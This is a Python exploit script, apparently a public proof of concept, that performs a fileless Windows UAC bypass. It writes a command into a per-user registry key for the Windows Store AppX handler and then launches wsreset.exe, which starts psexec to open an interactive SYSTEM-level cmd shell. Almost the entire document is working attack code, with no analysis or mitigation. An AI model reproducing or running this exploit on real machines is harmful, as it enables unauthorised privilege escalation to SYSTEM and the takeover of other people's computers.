#### Fileless UAC bypass (WSReset.exe)
#### @404death
#### base on : https://www.activecyber.us/activelabs/windows-uac-bypass
import sys, os
from ctypes import *
import winreg
CMD                   = r"C:\Windows\System32\cmd.exe"
WS_RESET              = r'C:\Windows\System32\wsreset.exe'
#PYTHON_CMD           = "python"
test_cmd              = " -i -s cmd.exe"
SYSTEM_SHELL          = "psexec.exe"  # to get nt\system   
REG_PATH              = 'Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command'
DELEGATE_EXEC_REG_KEY = 'DelegateExecute'
def is_running_as_admin():
    '''
    Checks if the script is running with administrative privileges.
    Returns True if is running as admin, False otherwise.
    '''    
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
def create_reg_key(key, value):
    '''
    Creates a reg key
    '''
    try:        
        winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)                
        winreg.SetValueEx(registry_key, key, 0, winreg.REG_SZ, value)        
        winreg.CloseKey(registry_key)
    except WindowsError:        
        raise
def bypass_uac(cmd):
    '''
    Tries to bypass the UAC
    '''
    try:
        create_reg_key(DELEGATE_EXEC_REG_KEY, '')
        create_reg_key(None, cmd)    
    except WindowsError:
        raise
def execute():        
    if not is_running_as_admin():
        print('[!] Fileless UAC Bypass via Windows Store by @404death ')
        print('[+] Trying to bypass the UAC')
        print('[+] Waiting to get SYSTEM shell !!!')
        try:                
            current_dir = os.path.dirname(os.path.realpath(__file__)) + '\\' + SYSTEM_SHELL
            cmd = '{} /c {} {}'.format(CMD, current_dir, test_cmd)
            bypass_uac(cmd)                
            os.system(WS_RESET)
            print('[+] Pwnedd !!! you g0t system shell !!!')                
            sys.exit(0)                
        except WindowsError:
            sys.exit(1)
    else:
        print('[+] xailay !!!')        
if __name__ == '__main__':
    execute()